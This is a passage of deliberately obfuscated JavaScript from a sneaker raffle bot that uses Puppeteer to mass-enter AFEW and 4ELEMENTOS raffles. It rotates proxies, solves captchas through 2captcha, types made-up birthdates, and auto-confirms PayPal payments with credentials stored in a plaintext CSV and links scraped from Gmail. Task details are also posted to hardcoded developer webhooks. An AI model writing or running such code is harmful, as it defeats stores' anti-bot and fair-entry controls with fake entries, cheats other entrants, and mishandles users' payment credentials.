        if (_0x2847ed[_0x36a48e + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x237f95;
}
;
async function _0x27e463(_0x440540, _0xf6e1a9) {
    if (_0xe0182d != 'yes')
        var _0xe0182d = '', _0x547a40 = 0x0;
    async function _0x4e4303() {
        var _0x440816 = _0x1dee0c['readFileSync']('../accounts/paypal.csv', 'utf-8');
        let _0x37e1fc = _0x548d40['parse'](_0x440816, { 'header': !![] })['data'];
        console['log']('Choose\x20a\x20Paypal\x20to\x20use:\x0a');
        for (var _0x3c3ecb = 0x0; _0x3c3ecb < _0x37e1fc['length']; _0x3c3ecb++) {
            console['log']('(' + _0x3c3ecb + ')\x20' + _0x37e1fc[_0x3c3ecb]['Email']);
        }
        console['log']('\x0a(' + _0x37e1fc['length'] + ')\x20' + _0x28396b['cyan']('Add\x20a\x20new\x20account'));
        let _0x5620bc = await _0x48d650['get']('Option');
        if (_0x5620bc['Option'] < _0x37e1fc['length'])
            return _0x37e1fc[_0x5620bc['Option']];
        console['clear'](), console['log']('Adding\x20a\x20new\x20account\x0aEnter\x20your\x20paypal\x27s\x20email:\x0a');
        let _0x331db8 = {}, _0x5aa874 = await _0x48d650['get']('Email');
        _0x331db8['Email'] = _0x5aa874['Email'];
        var _0x1dbd77 = Math['round'](Math['random']() * (_0xf6e1a9['length'] - 0x1));
        _0x331db8['Proxy'] = _0xf6e1a9[_0x1dbd77], console['clear'](), console['log']('Enter\x20your\x20paypal\x27s\x20password:\x0a');
        let _0x2b4f78 = await _0x48d650['get']('Password');
        return _0x331db8['Password'] = _0x2b4f78['Password'], _0x1dee0c['appendFileSync']('../accounts/paypal.csv', '\x0a' + _0x331db8['Email'] + ',' + _0x331db8['Password'] + ',' + _0x331db8['Proxy']), _0x331db8;
    }
    let _0x4de6ce = await _0x4e4303();
    var _0x285d41 = [];
    console['clear'](), console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify\x20on\x20this\x20paypal?');
    let _0x4f8f67 = await _0x48d650['get']('Amount'), _0x3fc92d = _0x4f8f67['Amount'];
    async function _0x376b44() {
        let _0x2ea1fe = 0x0;
        var _0x384733 = new _0x15c146({
            'user': _0x5d2560['masterMail'],
            'password': _0x5d2560['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x54dfda(_0xc62fed) {
            _0x384733['openBox']('INBOX', ![], _0xc62fed);
        }
        _0x384733['once']('ready', function () {
            _0x54dfda(function (_0x3f6e66, _0x5ee532) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x3f6e66)
                    throw _0x3f6e66;
                _0x384733['seq']['search']([
                    'UNSEEN',
                    [
                        'SUBJECT',
                        'PayPal'
                    ]
                ], function (_0x50902b, _0x40c71b) {
                    if (!_0x40c71b || !_0x40c71b['length'])
                        console['log'](_0x52b59e() + '\x20[' + _0x440540 + ']\x20No\x20mails\x20found'), _0x384733['end']();
                    else {
                        _0x40c71b = _0x40c71b['slice'](0x0, _0x3fc92d);
                        var _0x572587 = _0x384733['seq']['fetch'](_0x40c71b, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x572587['on']('message', function (_0x111da6, _0x3dd7c1) {
                            var _0x4982ef = '(#' + _0x3dd7c1 + ')\x20';
                            _0x111da6['on']('body', function (_0xe3c7f2, _0x22adc) {
                                _0x2e3fa0(_0xe3c7f2, (_0x22cbf4, _0xc53f86) => {
                                    if (_0xc53f86['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0xc53f86['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0xc53f86['text']['split']('[')[0x2];
                                        var _0xb0d994 = mes['split'](']')[0x0];
                                        _0x285d41['push'](_0xb0d994);
                                    }
                                });
                            }), _0x111da6['once']('end', function () {
                                _0x2ea1fe++;
                            });
                        }), _0x572587['once']('error', function (_0xd17a3b) {
                            console['log']('Fetch\x20error:\x20' + _0xd17a3b);
                        }), _0x572587['once']('end', function () {
                            _0x384733['end']();
                        });
                    }
                });
            });
        }), _0x384733['once']('error', function (_0x97270d) {
            console['log'](_0x28396b['red'](_0x97270d['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x384733['once']('end', async function () {
        }), _0x384733['connect']();
    }
    try {
        _0x376b44(), await _0x5954fc(0xfa0), console['log']('Found\x20' + _0x285d41['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x5954fc(0xfa0);
    }
    var _0xafa539;
    _0x34c195('' + _0x440540);
    var _0x5b5238 = _0x4de6ce['Proxy']['split'](':'), _0x2d17bf;
    try {
        _0x2d17bf = await _0x13c80e['launch']({
            'userDataDir': 'sessions/' + _0x4de6ce['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x5b5238[0x0] + ':' + _0x5b5238[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    } catch {
        _0x2d17bf = await _0x13c80e['launch']({
            'userDataDir': 'sessions/' + _0x4de6ce['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x5b5238[0x0] + ':' + _0x5b5238[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    }
    try {
        console['log'](_0x52b59e() + '\x20[' + _0x440540 + ']\x20Getting\x20Session');
        const _0xd8f955 = await _0x2d17bf['newPage']();
        await _0xd8f955['authenticate']({
            'username': '' + _0x5b5238[0x2],
            'password': '' + _0x5b5238[0x3]
        }), await _0xd8f955['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0xd8f955['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x52b59e() + '\x20[' + _0x440540 + ']\x20Logging\x20in\x20to\x20your\x20Paypal\x20account..'), await _0xd8f955['waitForSelector']('#email');
            let _0xfab1d = await _0xd8f955['$eval']('#email', _0x495636 => _0x495636['getAttribute']('value'));
            if (_0xfab1d == '') {
                await _0xd8f955['type']('#email', _0x4de6ce['Email']), await _0x5954fc(0x1d3);
                let _0x28dd79 = await _0xd8f955['$']('#splitPassword');
                _0x28dd79 && (await _0xd8f955['click']('#btnNext'), await _0x5954fc(0xa28)), await _0xd8f955['type']('#password', _0x4de6ce['Password']), await _0x5954fc(0x35c), await _0xd8f955['click']('#btnLogin');
            } else
                await _0xd8f955['type']('#password', _0x4de6ce['Password']), await _0x5954fc(0x35c), await _0xd8f955['click']('#btnLogin');
            await _0xd8f955['waitForSelector']('#reactContainer__balance', { 'timeout': 0x493e0 }), console['log'](_0x52b59e() + '\x20[' + _0x440540 + ']\x20Successfully\x20logged\x20in'), await _0x5954fc(0x2710);
        } catch (_0x39a79f) {
            throw new Error('Login\x20session\x20expired\x20' + _0x39a79f);
        }
        for (var _0x1de236 = 0x0; _0x1de236 < _0x285d41['length']; _0x1de236++) {
            console['log'](_0x52b59e() + '\x20[' + _0x440540 + ']\x20Task\x20' + (_0x1de236 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x34c195(_0x440540 + '\x20Task\x20' + (_0x1de236 + 0x1) + '\x20/\x20' + _0x285d41['length']);
            const _0x42201e = await _0x2d17bf['newPage']();
            await _0x42201e['goto']('' + _0x285d41[_0x1de236], { 'waitUntil': 'networkidle2' }), await _0x5954fc(0xbb8);
            try {
                const _0x3948e0 = await _0x42201e['$']('#challenge-heading');
                _0x3948e0 && (console['log'](_0x52b59e() + '\x20[' + _0x440540 + ']\x20Task\x20' + (_0x1de236 + 0x1) + '\x20:\x20' + _0x28396b['yellow']('2FA\x20Required')), await _0x42201e['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x5954fc(0x9c40), await _0x42201e['waitForSelector']('#payment-submit-btn'), await _0x42201e['$eval']('#payment-submit-btn', _0x3ca40c => _0x3ca40c['click']()), await _0x42201e['click']('#payment-submit-btn');
                try {
                    await _0x42201e['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x5954fc(0x5dc), console['log'](_0x28396b['green'](_0x52b59e() + '\x20[' + _0x440540 + ']\x20Task\x20' + (_0x1de236 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x41d3cb) {
                    _0xe0182d = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0x41d3cb['message']);
                } finally {
                    if (_0xe0182d == 'yes' && _0x547a40 != 0x2) {
                        console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x440540['name'] + ']\x20Task\x20' + (_0x1de236 + 0x1) + '\x20:\x20Retrying\x20(' + _0x547a40 + '\x20/\x205)')), _0x1de236 = _0x1de236 - 0x1, _0x547a40 = _0x547a40 + 0x1;
                        continue;
                    }
                    _0xe0182d == 'yes' && _0x547a40 >= 0x2 && (_0x1c26ba(csv[_0x1de236], _0x440540), _0xe0182d = 'no', _0x547a40 = 0x0), await _0x42201e['close'](), await _0x5954fc(0x4650);
                }
            } catch (_0x138879) {
                console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x440540 + ']\x20Task\x20' + (_0x1de236 + 0x1) + '\x20:\x20' + _0x138879));
            }
        }
    } catch (_0x54fa18) {
        console['log'](_0x28396b['red']('' + _0x54fa18));
    } finally {
        await _0x2d17bf['close']();
    }
}
const _0x1b4334 = [
    {
        'name': '4ELEMENTOS',
        'modules': [{
            'name': '4ELEMENTOS\x20Raffle\x20Entries',
            'store': '4ELEMENTOS',
            'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
            'function': async function (_0x2f473c, _0x3fdf8e, _0x363363) {
                _0x13c80e['use'](_0x146fac()), _0x13c80e['use'](_0x4b936d({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x5d2560['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x2a92ed = 0x0; _0x2a92ed < _0x3fdf8e['length']; _0x2a92ed++) {
                    if (_0xc0a541 != 'yes')
                        var _0xc0a541 = '', _0x28750b = 0x0;
                    var _0x24b4d1;
                    try {
                        await _0x414596(_0x3fdf8e, _0x2a92ed);
                    } catch {
                        _0xc0a541 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    _0x34c195(_0x2f473c['name'] + '\x20Task\x20' + (_0x2a92ed + 0x1) + '\x20/\x20' + _0x3fdf8e['length'] + '\x20||\x20File:\x20' + _0x54b9d3 + '\x20Proxies:\x20' + _0x3dc05f);
                    var _0x3b0a74 = [
                        '40',
                        '40,5',
                        '41',
                        '42',
                        '42,5',
                        '43',
                        '44',
                        '45',
                        '45,5',
                        '46',
                        '47',
                        '47,5',
                        '48'
                    ], _0x22ca35 = Math['round'](Math['random']() * (_0x3b0a74['length'] - 0x1));
                    _0x3fdf8e[_0x2a92ed]['Size'] == 'RANDOM' && (_0x3fdf8e[_0x2a92ed]['Size'] = _0x3b0a74[_0x22ca35]);
                    var _0x29725d = Math['round'](Math['random']() * (_0x363363['length'] - 0x1)), _0x17df14 = _0x363363[_0x29725d]['split'](':'), _0x8c8ec6;
                    try {
                        _0x8c8ec6 = await _0x13c80e['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x17df14[0x0] + ':' + _0x17df14[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x8c8ec6 = await _0x13c80e['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x17df14[0x0] + ':' + _0x17df14[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        console['log'](_0x52b59e() + '\x20[' + _0x2f473c['name'] + ']\x20Task\x20' + (_0x2a92ed + 0x1) + '\x20:\x20Getting\x20Session');
                        const _0x5d7ec7 = await _0x8c8ec6['newPage']();
                        await _0x5d7ec7['authenticate']({
                            'username': '' + _0x17df14[0x2],
                            'password': '' + _0x17df14[0x3]
                        }), await _0x5d7ec7['setRequestInterception'](!![]), _0x5d7ec7['on']('request', _0x32986b => {
                            _0x32986b['resourceType']() === 'image' || _0x32986b['resourceType']() === 'font' || _0x32986b['resourceType']() === 'media' ? _0x32986b['abort']() : _0x32986b['continue']();
                        }), await _0x5d7ec7['goto'](_0x3fdf8e[_0x2a92ed]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x52b59e() + '\x20[' + _0x2f473c['name'] + ']\x20Task\x20' + (_0x2a92ed + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x5954fc(0x3e8), await _0x5d7ec7['waitForSelector']('#accept-all-gdpr'), await _0x5d7ec7['click']('#accept-all-gdpr'), await _0x5d7ec7['waitForSelector']('#main\x20>\x20div.product-container\x20>\x20div.col-lg-4.col-sm-12.sticky-right\x20>\x20div\x20>\x20div.cn_content.cn_content_type_inline\x20>\x20form\x20>\x20div\x20>\x20div\x20>\x20div\x20>\x20div\x20>\x20button'), await _0x5954fc(0xbb8);
                        let _0x51ca1b = await _0x5d7ec7['$$']('button');
                        for (button of _0x51ca1b) {
                            let _0xa0663a = await _0x5d7ec7['evaluate'](_0x3e9f29 => _0x3e9f29['innerHTML'], button);
                            if (_0xa0663a['toLowerCase']()['includes']('ntame')) {
                                console['log']('click'), await button['click']();
                                break;
                            }
                        }
                        await _0x5954fc(0x1388), await _0x5d7ec7['waitForSelector']('.cn_content_type_full-screen'), console['log'](_0x52b59e() + '\x20[' + _0x2f473c['name'] + ']\x20Task\x20' + (_0x2a92ed + 0x1) + '\x20:\x20Checking\x20Information'), await _0x5954fc(0x3e8);
                        let _0x13e042 = await _0x5d7ec7['$$']('input[name=\x22email\x22]');
                        await _0x13e042[0x1]['click'](), await _0x5954fc(0x12c), await _0x5d7ec7['keyboard']['type'](_0x3fdf8e[_0x2a92ed]['Email']), await _0x5954fc(0x1c2), await _0x5d7ec7['type']('input[name=\x22Nombre\x22]', _0x3fdf8e[_0x2a92ed]['FirstName'] + '\x20' + _0x3fdf8e[_0x2a92ed]['LastName']), await _0x5954fc(0x1c2), await _0x5d7ec7['type']('input[name=\x22Direccion\x22]', _0x3fdf8e[_0x2a92ed]['Address1'] + '\x20' + _0x3fdf8e[_0x2a92ed]['HouseNumber'] + '\x20' + _0x3fdf8e[_0x2a92ed]['Address2']), await _0x5954fc(0x1c2), await _0x5d7ec7['type']('input[name=\x22Ciudad\x22]', _0x3fdf8e[_0x2a92ed]['City']), await _0x5954fc(0x1c2), await _0x5d7ec7['type']('input[name=\x22Provincia\x22]', _0x3fdf8e[_0x2a92ed]['State']), await _0x5954fc(0x1c2), await _0x5d7ec7['type']('input[name=\x22CP\x22]', _0x3fdf8e[_0x2a92ed]['Zip']), await _0x5954fc(0x1c2), await _0x5d7ec7['select']('select[name=\x22Pais\x22]', _0x3fdf8e[_0x2a92ed]['Country']), await _0x5954fc(0x1c2), await _0x5d7ec7['type']('input[name=\x22Telefono\x22]', _0x3fdf8e[_0x2a92ed]['Phone']), await _0x5954fc(0x1c2), await _0x5d7ec7['type']('input[name=\x22cumple\x22]', _0x19e736(0x1, 0x14) + '-' + _0x19e736(0x1, 0xb) + '-' + _0x19e736(0x7c6, 0x7d0), { 'delay': 0x96 }), await _0x5954fc(0x1c2), await _0x5d7ec7['type']('input[name=\x22Instagram\x22]', _0x3fdf8e[_0x2a92ed]['Follower']), await _0x5954fc(0x1c2), await _0x5d7ec7['type']('input[name=\x22Talla\x22]', _0x3fdf8e[_0x2a92ed]['Size']), await _0x5954fc(0x1f4), await _0x5d7ec7['click']('#sexo_hombre'), await _0x5954fc(0x1f4), await _0x5d7ec7['click']('#idioma_ingles'), await _0x5954fc(0x1f4), await _0x5d7ec7['click']('#privacidad_si'), await _0x5954fc(0x1f4), await _0x5d7ec7['click']('#acepta_suscripcion_si'), await _0x5954fc(0x1f4), console['log'](_0x52b59e() + '\x20[' + _0x2f473c['name'] + ']\x20Task\x20' + (_0x2a92ed + 0x1) + '\x20:\x20Sending\x20Request');
                        let _0x27e6a5 = await _0x5d7ec7['$$']('button');
                        for (button of _0x27e6a5) {
                            let _0x267b38 = await _0x5d7ec7['evaluate'](_0x41a9b3 => _0x41a9b3['innerHTML'], button);
                            if (_0x267b38['toLowerCase']()['includes']('send')) {
                                console['log']('click'), await button['click']();
                                break;
                            }
                        }
                        await _0x5954fc(0x1388), console['log'](_0x28396b['green'](_0x52b59e() + '\x20[' + _0x2f473c['name'] + ']\x20Task\x20' + (_0x2a92ed + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0xc0a541 = '';
                        var _0x3ad182 = await _0xf2c38e(_0x3fdf8e[_0x2a92ed], _0x2f473c, 'dev', ![]), _0x44371c = await _0xf2c38e(_0x3fdf8e[_0x2a92ed], _0x2f473c, 'pub', ![]);
                        const _0x477980 = {
                            'succesDEVMSG': { 'embeds': [_0x3ad182] },
                            'succesPUBMSG': { 'embeds': [_0x44371c] }
                        };
                        try {
                            _0x5d2560['webhook'] != undefined && _0x5d2560['webhook'] != '' && await _0x4bfa5b(_0x5d2560['webhook'], _0x477980['succesDEVMSG']), await _0x5954fc(0xc8), await _0x4bfa5b(_0x4f558b, _0x477980['succesDEVMSG']), await _0x5954fc(0xc8), await _0x4bfa5b(_0x4b117a, _0x477980['succesPUBMSG']);
                        } catch (_0x23ec27) {
                            console['log'](_0x28396b['yellow'](_0x52b59e() + '\x20[' + _0x2f473c['name'] + ']\x20Task\x20' + (_0x2a92ed + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x23ec27));
                        }
                    } catch (_0xe3131) {
                        console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x2f473c['name'] + ']\x20Task\x20' + (_0x2a92ed + 0x1) + '\x20:\x20' + _0xe3131)), _0x24b4d1 = '' + _0xe3131;
                        var _0x7a7d1e = await _0xf2c38e(_0x3fdf8e[_0x2a92ed], _0x2f473c, 'dev', !![], _0x24b4d1), _0x3ad182 = await _0xf2c38e(_0x3fdf8e[_0x2a92ed], _0x2f473c, 'dev', ![]), _0x44371c = await _0xf2c38e(_0x3fdf8e[_0x2a92ed], _0x2f473c, 'pub', ![]);
                        const _0x595fc6 = {
                            'succesDEVMSG': { 'embeds': [_0x3ad182] },
                            'succesPUBMSG': { 'embeds': [_0x44371c] }
                        };
                        _0x595fc6['errorDEV'] = { 'embeds': [_0x7a7d1e] }, _0x5d2560['webhook'] != undefined && _0x5d2560['webhook'] != '' && await _0x4bfa5b(_0x5d2560['webhook'], _0x595fc6['errorDEV']), await _0x4bfa5b(_0x248b77, _0x595fc6['errorDEV']), _0xe3131 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0xc0a541 = 'yes');
                    } finally {
                        _0x8c8ec6['close']();
                        if (_0xc0a541 == 'yes' && _0x28750b != 0x5 && _0x24b4d1 != 'Size\x20Not\x20Found') {
                            console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x2f473c['name'] + ']\x20Task\x20' + (_0x2a92ed + 0x1) + '\x20:\x20Retrying\x20(' + _0x28750b + '\x20/\x205)\x20')), _0x2a92ed = _0x2a92ed - 0x1, _0x28750b = _0x28750b + 0x1;
                            continue;
                        }
                        _0xc0a541 == 'yes' && _0x28750b >= 0x5 && (_0x1c26ba(_0x3fdf8e[_0x2a92ed], _0x2f473c), _0xc0a541 = 'no', _0x28750b = 0x0), console['log'](_0x52b59e() + '\x20[' + _0x2f473c['name'] + ']\x20Waiting\x20for\x20' + _0x5d2560['delay'] + '\x20ms'), await _0x5954fc(_0x5d2560['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x2f4c59, _0x45cd79, _0x55d25e) {
                for (var _0x482f6f = 0x0; _0x482f6f < _0x45cd79['length']; _0x482f6f++) {
                    _0x5d2560['AfewDelay'] = _0x5d2560['delay'];
                    var _0x283b49;
                    if (_0x4d3d5b != 'yes')
                        var _0x4d3d5b = '', _0x2f2185 = 0x0;
                    var _0x5e8969 = _0x45cd79[_0x482f6f]['Url'], _0x149125 = _0x45cd79[_0x482f6f];
                    _0x34c195(_0x2f4c59['name'] + '\x20Task\x20' + (_0x482f6f + 0x1) + '\x20/\x20' + _0x45cd79['length'] + '\x20||\x20File:\x20' + _0x54b9d3 + '\x20Proxies:\x20' + _0x3dc05f);
                    try {
                        await _0x414596(_0x45cd79, _0x482f6f);
                    } catch {
                        _0x4d3d5b = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x2edf2a(_0x13e49b) {
                        const _0x5da3e0 = _0x1dee0c['readFileSync']('../successful-tasks.csv', 'utf8'), _0xac7381 = _0x548d40['parse'](_0x5da3e0, { 'header': !![] })['data'];
                        let _0x2d5ece = ![];
                        for (var _0x52c26b of _0xac7381) {
                            if (_0x52c26b['Url'] == _0x13e49b['Url'] && _0x52c26b['Email'] == _0x13e49b['Email']) {
                                _0x2d5ece = !![];
                                break;
                            }
                        }
                        return _0x2d5ece;
                    }
                    if (await _0x2edf2a(_0x45cd79[_0x482f6f]) == !![]) {
                        console['log'](_0x52b59e() + '\x20[' + _0x2f4c59['name'] + ']\x20Task\x20' + (_0x482f6f + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x5acf32 = await _0xf2c38e(_0x45cd79[_0x482f6f], _0x2f4c59, 'dev', ![]), _0x2ea2ce = await _0xf2c38e(_0x45cd79[_0x482f6f], _0x2f4c59, 'pub', ![]);
                    const _0x2dff7d = {
                        'succesDEVMSG': { 'embeds': [_0x5acf32] },
                        'succesPUBMSG': { 'embeds': [_0x2ea2ce] }
                    };
                    if (_0x45cd79[_0x482f6f]['Email'] == '' || _0x45cd79[_0x482f6f]['FirstName'] == '' || _0x45cd79[_0x482f6f]['LastName'] == '' || _0x45cd79[_0x482f6f]['Country'] == '' || _0x45cd79[_0x482f6f]['Size'] == '' || _0x45cd79[_0x482f6f]['Address1'] == '' || _0x45cd79[_0x482f6f]['Zip'] == '') {
                        console['log'](_0x52b59e() + '\x20[' + _0x2f4c59['name'] + ']\x20Task\x20' + (_0x482f6f + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    _0x45cd79[_0x482f6f]['Country']['length'] == 0x2 && (_0x45cd79[_0x482f6f]['Country'] = _0x3f2a7f[_0x45cd79[_0x482f6f]['Country']]);
                    if (_0x5d2560['useRandomProxy'] = ![])
                        var _0x536cda = _0x55d25e[_0x482f6f]['split'](':');
                    else
                        var _0x352969 = Math['round'](Math['random']() * (_0x55d25e['length'] - 0x1)), _0x536cda = _0x55d25e[_0x352969]['split'](':');
                    var _0x445137;
                    try {
                        _0x445137 = await _0x13c80e['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x536cda[0x0] + ':' + _0x536cda[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x445137 = await _0x13c80e['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x536cda[0x0] + ':' + _0x536cda[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        var _0x5dcb10 = JSON['parse'](_0x1dee0c['readFileSync']('sizes.json', 'utf-8')), _0x5e8969 = _0x45cd79[_0x482f6f]['Url'], _0x49ab74 = _0x45cd79[_0x482f6f]['Size'], _0xe5b7ab;
                        async function _0x1e7e1f() {
                            var _0x3627e4 = new _0x57d6ec['CookieJar']();
                            console['log'](_0x52b59e() + '\x20[' + _0x2f4c59['name'] + ']\x20Task\x20' + (_0x482f6f + 0x1) + '\x20:\x20Getting\x20Session');
                            var _0x41893f;
                            let _0x2ab9f3 = {
                                'method': 'GET',
                                'cookieJar': _0x3627e4,
                                'headers': {
                                    'Connection': 'keep-alive',
                                    'Pragma': 'no-cache',
                                    'Cache-Control': 'no-cache',
                                    'sec-ch-ua': '\x22Google\x20Chrome\x22;v=\x2289\x22,\x20\x22Chromium\x22;v=\x2289\x22,\x20\x22;Not\x20A\x20Brand\x22;v=\x2299\x22',
                                    'sec-ch-ua-mobile': '?0',
                                    'DNT': '1',
                                    'Upgrade-Insecure-Requests': '1',
                                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                    'cookies': '',
                                    'Sec-Fetch-Site': 'none',
                                    'Sec-Fetch-Mode': 'navigate',
                                    'Sec-Fetch-User': '?1',
                                    'Sec-Fetch-Dest': 'document',
                                    'Accept-Language': 'en-US,en;q=0.9'
                                },
                                'proxy': 'http://' + _0x536cda[0x2] + ':' + _0x536cda[0x3] + '@' + _0x536cda[0x0] + ':' + _0x536cda[0x1]
                            }, _0x70374d = _0x5e8969['replace']('de.afew-store.com', 'en.afew-store.com')['replace']('en.afew-store.com', 'raffles.afew-store.com'), _0x1c6314 = _0x70374d + '.json', _0x1ddce5 = await _0x2e12a3(_0x1c6314);
                            console['log'](_0x52b59e() + '\x20[' + _0x2f4c59['name'] + ']\x20Task\x20' + (_0x482f6f + 0x1) + '\x20:\x20Getting\x20Variants');
                            let _0x2e8b23 = _0x1ddce5['data']['product']['variants'];
                            if (_0x49ab74 != 'RANDOM') {
                                if (_0x2e8b23[0x1]['option1']['includes']('W')) {
                                    const _0x5cb5ab = _0x5dcb10['women']['find'](_0x5e3057 => _0x5e3057['EUsize'] === _0x49ab74);
                                    _0x5cb5ab && (_0x49ab74 = _0x5cb5ab['size']);
                                } else {
                                    if (_0x2e8b23[0x1]['option1']['includes']('Y')) {
                                        const _0x860fb9 = _0x5dcb10['men']['find'](_0x12d1fd => _0x12d1fd['EUsize'] === _0x49ab74);
                                        _0x860fb9 && (_0x49ab74 = _0x860fb9['size'] + 'Y');
                                    } else {
                                        const _0x22860e = _0x5dcb10['men']['find'](_0x3dfdcc => _0x3dfdcc['EUsize'] === _0x49ab74);
                                        _0x22860e && (_0x49ab74 = _0x22860e['size']);
                                    }
                                }
                                for (var _0x42efd9 of _0x2e8b23) {
                                    _0x42efd9['option1'] == _0x49ab74 && (_0x41893f = _0x42efd9['id']);
                                }
                            } else {
                                var _0x545984 = Math['round'](Math['random']() * (_0x2e8b23['length'] - 0x1));
                                _0x41893f = _0x2e8b23[_0x545984]['id'];
                            }
                            console['log'](_0x52b59e() + '\x20[' + _0x2f4c59['name'] + ']\x20Task\x20' + (_0x482f6f + 0x1) + '\x20:\x20Adding\x20to\x20Cart'), addToCart = await _0x2e12a3('https://raffles.afew-store.com/cart/' + _0x41893f + ':1'), _0xe5b7ab = addToCart['request']['res']['responseUrl'];
                        }
                        try {
                            await _0x1e7e1f();
                        } catch (_0x1c92bb) {
                            if (_0x1c92bb['message']['includes']('TUNN'))
                                throw new Error('Proxy\x20Connection\x20Error');
                            throw new Error('Proxy\x20Error:\x20' + _0x1c92bb);
                        }
                        const _0x5f490e = await _0x445137['newPage']();
                        await _0x5f490e['setDefaultNavigationTimeout'](0x1d4c0), await _0x5f490e['authenticate']({
                            'username': '' + _0x536cda[0x2],
                            'password': '' + _0x536cda[0x3]
                        }), await _0x5f490e['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x5f490e['setRequestInterception'](!![]), _0x5f490e['on']('request', _0x3df234 => {
                            _0x3df234['resourceType']() === 'image' || _0x3df234['resourceType']() === 'font' || _0x3df234['resourceType']() === 'media' ? _0x3df234['abort']() : _0x3df234['continue']();
                        });
                        try {
                            await _0x5f490e['goto'](_0xe5b7ab, { 'waituntil': 'networkidle0' });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        console['log'](_0x52b59e() + '\x20[' + _0x2f4c59['name'] + ']\x20Task\x20' + (_0x482f6f + 0x1) + '\x20:\x20Submitting\x20Information');
                        try {
                            await _0x5f490e['waitForSelector']('#checkout_email');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
